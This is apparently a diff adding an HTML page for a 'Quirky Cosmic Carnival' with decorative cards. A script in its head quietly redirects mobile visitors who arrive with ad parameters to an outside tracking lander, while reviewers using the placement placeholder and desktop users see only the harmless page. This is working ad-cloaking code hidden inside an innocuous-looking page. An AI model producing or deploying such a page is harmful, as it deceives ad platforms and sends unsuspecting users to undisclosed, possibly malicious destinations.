@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quirky Cosmic Carnival</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #ff8c00;
+            padding: 20px;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .card {
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            padding: 15px;
+            transform: rotate(3deg);
+            transition: transform 0.3s;
+        }
+        .card:hover {
+            transform: rotate(-3deg) scale(1.05);
+        }
+        footer {
+            background-color: #4b0082;
+            color: white;
+            text-align: center;
+            padding: 10px;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to the Quirky Cosmic Carnival</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Intergalactic Juggling</h2>
+            <p>Watch aliens juggle miniature planets!</p>
+        </div>
+        <div class="card">
+            <h2>Zero-Gravity Cotton Candy</h2>
+            <p>Experience the fluffiest treat in the universe!</p>
+        </div>
+        <div class="card">
+            <h2>Moonwalk Dance-Off</h2>
+            <p>Show off your best lunar moves!</p>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html" style="color: white;">Privacy Policy</a>
+    </footer>
+</body>
+</html>
